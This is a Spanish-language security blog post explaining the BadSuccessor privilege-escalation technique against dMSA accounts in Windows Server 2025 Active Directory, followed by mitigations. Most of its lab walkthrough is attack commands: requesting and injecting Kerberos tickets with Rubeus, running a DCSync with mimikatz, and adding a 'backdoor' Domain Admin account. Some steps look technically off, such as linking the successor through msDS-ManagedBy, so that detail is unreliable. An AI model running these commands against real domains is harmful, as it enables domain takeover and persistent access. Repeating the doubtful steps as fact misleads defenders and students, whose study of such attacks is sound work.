---
title: BadSuccessor - Escalada de privilegios abusando de dMSA en Active Directory
date: 2025-05-22 09:00:00 
categories: [CIBERATAQUES]
tags: [ciberseguridad, ciberataque, vulnerabilidad]
description: Yuval Gordon, investigador de Akamai, ha descubierto una técnica avanzada de escalada de privilegios en entornos Windows Server 2025 conocida como BadSuccessor.
image: /assets/136/preview1.png
---

Yuval Gordon, investigador de Akamai, ha descubierto una técnica avanzada de escalada de privilegios en entornos Windows Server 2025 conocida como BadSuccessor. Esta técnica depende de una nueva funcionalidad legítima: las Cuentas de Servicio Administradas Delegadas (dMSA).

### ¿Qué son las dMSA?

Las Delegated Managed Service Accounts (dMSA) fueron introducidas en Windows Server 2025 como una mejora sobre las Managed Service Accounts (MSA) y Group Managed Service Accounts (gMSA). Su objetivo es permitir una gestión centralizada, segura y delegada de cuentas de servicio, incluyendo:

- Rotación automática de contraseñas.
- Restricción por máquina (sólo equipos autorizados pueden usarla).
- Delegación de control para facilitar la administración sin comprometer el principio de privilegios mínimos.

Sin embargo, es precisamente esta capacidad de delegación la que abre la puerta a BadSuccessor.

### La idea detrás de BadSuccessor

BadSuccessor se basa en el abuso de la funcionalidad que permite delegar la gestión de una dMSA. Mediante esta característica, es posible que una entidad (usuario o grupo) administre otra cuenta de servicio sin necesidad de privilegios directos de dominio.

El problema aparece cuando:

- Una cuenta de bajo privilegio es delegada para gestionar una dMSA privilegiada (por ejemplo, usada por un servicio con permisos elevados).
- Esta cuenta crea una nueva dMSA "sucesora" que se declara como reemplazo de la dMSA original.
- Active Directory acepta al sucesor como legítimo, permitiéndole heredar privilegios y usos de la cuenta original.

Este flujo puede usarse para escalar privilegios dentro del dominio sin explotar vulnerabilidades, sino simplemente configuraciones laxas de delegación.

## Escenario de ataque

- El atacante crea una nueva cuenta dMSA, por ejemplo: attacker$.
- El atacante modifica los atributos del objeto de AD de la dMSA objetivo (por ejemplo, svc_SQLProd$) para vincular la nueva dMSA (attacker$) como su sucesora.
- El atacante solicita un TGT (Ticket Granting Ticket) a través de Kerberos usando su nueva cuenta attacker$.
- El DC emite un TGT válido para attacker$, que incluye acceso y permisos equivalentes a los de la cuenta original (target user, como svc_ejemplo$). Como resultado, el atacante actúa con privilegios heredados. Si la dMSA original era miembro de grupos como Domain Admins, ahora attacker$ tiene acceso al dominio completo.

<img src="/assets/136/136-1.jpg"  width="500" height="500">

### Requisitos del ataque

- Control parcial o total de una cuenta con delegación sobre una dMSA privilegiada.
- Acceso a un entorno de dominio con controladores de dominio actualizados a Windows Server 2025.
- Conocimiento de las estructuras de delegación en Active Directory.

### Ejemplo - Escenario de ataque completo: De usuario delegado a Domain Admin

**Infraestructura del laboratorio**
- Dominio: lab.local
- DC: DC01.lab.local (Windows Server 2025)
- Cuenta dMSA privilegiada: svc_SQLProd$ (usada por un SQL Server miembro de Domain Admins)
- Usuario con delegación: john.smith (puede gestionar la cuenta svc_SQLProd$)

**Objetivo**

Elevar privilegios desde john.smith hasta obtener un TGT como svc_SQLProd$, lo cual permite realizar acciones como un Domain Admin.

**1. Verificar delegación sobre la dMSA**

    Get-ACL "AD:\CN=svc_SQLProd$,CN=Managed Service Accounts,DC=lab,DC=local" | Format-List

Verifica que john.smith tenga permisos como WriteProperty, GenericAll, o similares.

**2. Crear una dMSA sucesora**

    New-ADServiceAccount -Name "svc_Malicious" -RestrictToOutboundAuthenticationOnly:$true
    
    # Delegar la gestión (herencia/sucesión)
    Set-ADObject -Identity "CN=svc_SQLProd$,CN=Managed Service Accounts,DC=lab,DC=local" \
      -Add @{"msDS-ManagedBy"="CN=svc_Malicious,CN=Managed Service Accounts,DC=lab,DC=local"}

Este paso vincula la nueva dMSA como sucesora, heredando la funcionalidad de la original. 

**3. Instalar la dMSA en una máquina autorizada**

    Install-ADServiceAccount -Identity svc_Malicious
    Test-ADServiceAccount -Identity svc_Malicious

**4. Obtener el secreto gestionado (hash o contraseña)**

Instala el módulo RSAT si es necesario:

    Import-Module ActiveDirectory
    Get-ADServiceAccount svc_Malicious -Properties msDS-ManagedPassword

Alternativamente, usa PowerView o DSInternals para extraerlo:

    Get-ADComputerServiceAccountKey -AccountName svc_Malicious

**5. Solicitar un TGT con Rubeus**

    Rubeus.exe asktgt /user:svc_Malicious$ /rc4:<NTLM_HASH> /domain:lab.local

Y cargarlo en la sesión actual:

    Rubeus.exe ptt /ticket:<base64_TGT>

**6. Acciones como Domain Admin**
   
Si svc_SQLProd$ es miembro de Domain Admins, ahora el atacante puede:

    # Enumerar controladores
    nltest /dclist:lab.local
    
    # DCSync
    mimikatz "lsadump::dcsync /user:Administrator"
    
    # Agregar usuario administrador
    net user backdoor P@ssw0rd! /add
    dsmod group "CN=Domain Admins,CN=Users,DC=lab,DC=local" -addmbr "CN=backdoor,CN=Users,DC=lab,DC=local"

### Mitigaciones recomendadas

1. **Auditar la delegación de control** en cuentas de servicio: ninguna cuenta de bajo privilegio debería tener permisos sobre cuentas usadas por servicios críticos.

2. **Revisar el uso de sucesores** en configuraciones de dMSA: documentar qué cuentas pueden sustituir a otras.

3. **Limitar la creación de nuevas dMSA** a roles administrativos específicos y supervisados.

4. **Supervisar cambios en objetos dMSA** mediante logging y SIEM.

### Conclusión

BadSuccessor es un excelente ejemplo de cómo una funcionalidad legítima puede transformarse en un vector de ataque si no se configura correctamente. La aparición de dMSA en Windows Server 2025 introduce ventajas significativas para la gestión de servicios, pero también requiere una revisión cuidadosa de las políticas de delegación. Este tipo de investigaciones demuestran que la seguridad no está sólo en los parches, sino en el diseño y la gobernanza del entorno.






